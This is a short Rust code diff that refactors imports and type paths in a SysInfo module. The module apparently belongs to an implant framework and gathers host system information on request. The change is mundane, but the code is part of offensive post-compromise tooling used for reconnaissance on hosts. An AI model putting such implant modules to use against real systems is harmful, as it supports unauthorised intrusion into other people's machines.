@@ -1,8 +1,4 @@
-use async_trait::async_trait;
-use malefic_trait::module_impl;
-use crate::{check_request, Module, TaskResult};
-use malefic_proto::proto::implantpb::spite::Body;
-
+use crate::prelude::*;
 
 pub struct SysInfo {}
 #[async_trait]
@@ -10,8 +6,8 @@ pub struct SysInfo {}
 impl Module for SysInfo {}
 
 #[async_trait]
-impl crate::ModuleImpl for SysInfo {
-    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _: &mut crate::Output) -> crate::Result {
+impl malefic_proto::module::ModuleImpl for SysInfo {
+    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _: &mut malefic_proto::module::Output) -> malefic_proto::module::ModuleResult {
         let _ = check_request!(receiver, Body::Request)?;
         let info = malefic_helper::common::sysinfo::get_sysinfo();
         let os = info.os.unwrap();
